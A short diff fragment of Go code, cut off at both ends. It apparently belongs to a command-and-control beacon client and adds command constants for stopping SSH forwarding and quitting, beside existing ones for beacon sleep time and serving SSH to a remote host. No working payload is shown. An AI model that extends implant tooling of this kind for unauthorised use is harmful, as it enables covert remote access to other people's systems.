@@ -45,4 +45,8 @@ type Client struct {
 const (
 	SetSleeptime string = "setSleeptime" // modify time slept between beacons
 	ServeSSH     string = "serveSSH"     // start ssh and forward it to some host
-	StopSSH      string = "stopSSH"      // s
+	StopSSH      string = "stopSSH"      // stop all sshs and port forward on host
+	Quit         string = "Quit"         // ask the client to quit
+)
+
+// SSHClient is a st
